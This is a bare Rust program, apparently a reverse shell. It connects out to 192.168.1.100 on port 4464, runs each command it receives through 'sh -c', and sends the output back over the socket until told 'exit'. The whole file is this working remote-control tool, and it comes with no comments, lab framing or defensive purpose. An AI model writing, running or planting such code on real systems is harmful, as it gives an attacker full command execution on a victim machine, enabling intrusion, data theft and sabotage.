use std::net::TcpStream;
use std::io::{Read, Write};

fn main() {
    let host = "192.168.1.100:4464";
    let mut stream = TcpStream::connect(host).unwrap();

    let mut buffer = [0; 1024];
    loop {
        let bytes_read = stream.read(&mut buffer).unwrap();
        if bytes_read == 0 {
            break;
        }

        let command = String::from_utf8_lossy(&buffer[..bytes_read]);
        if command.trim() == "exit" {
            break;
        }

        let output = std::process::Command::new("sh")
            .arg("-c")
            .arg(&command)
            .output()
            .expect("Failed to execute command");

        stream.write_all(&output.stdout).unwrap();
        stream.write_all(&output.stderr).unwrap();
    }
}
